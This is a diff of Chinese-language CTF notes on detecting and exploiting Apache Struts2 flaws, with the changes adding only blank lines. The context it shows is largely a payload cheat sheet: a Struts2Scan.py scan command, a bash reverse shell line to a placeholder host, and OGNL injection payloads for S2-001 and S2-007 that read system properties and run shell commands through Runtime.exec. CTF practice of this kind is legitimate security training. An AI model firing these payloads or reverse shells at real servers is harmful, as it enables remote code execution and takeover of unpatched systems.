@@ -1,4 +1,5 @@
 # 判断strust2方法
+
 ```
 常规的办法有：
 
@@ -20,6 +21,7 @@ https://threathunter.org/?actionErrors=1111
 
 **可以使用工具Struts2Scan.py**
 [https://github.com/Vancomycin-g/Struts2Scan/](https://github.com/Vancomycin-g/Struts2Scan/)
+
 ```
 python Struts2Scan.py -u http://9143263b-fae3-4a8c-8d7d-03f229579cac.challenge.ctf.show/S2-005/example/HelloWorld.action
 
@@ -31,6 +33,7 @@ python Struts2Scan.py -u http://9143263b-fae3-4a8c-8d7d-03f229579cac.challenge.c
 flag有可能在环境变量当中，使用env命令查看环境变量的配置
 
 **漏洞利用：**
+
 ```
 bash -i >& /dev/tcp/x.x.x.x/port 0>&1
 ```
@@ -38,6 +41,7 @@ bash -i >& /dev/tcp/x.x.x.x/port 0>&1
 # S2-001
 
 struts2漏洞 S2-001是当用户提交表单数据且验证失败时，服务器使用OGNL表达式解析用户先前提交的参数值，%{value}并重新填充相应的表单数据。
+
 ```
 |获取tomcat路径|
 %{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}
@@ -64,7 +68,7 @@ redirect:${#req=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.Htt
 ```
 
 **S2-007**
+
 ```
 ' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('env').getInputStream())) + '
 ```
-
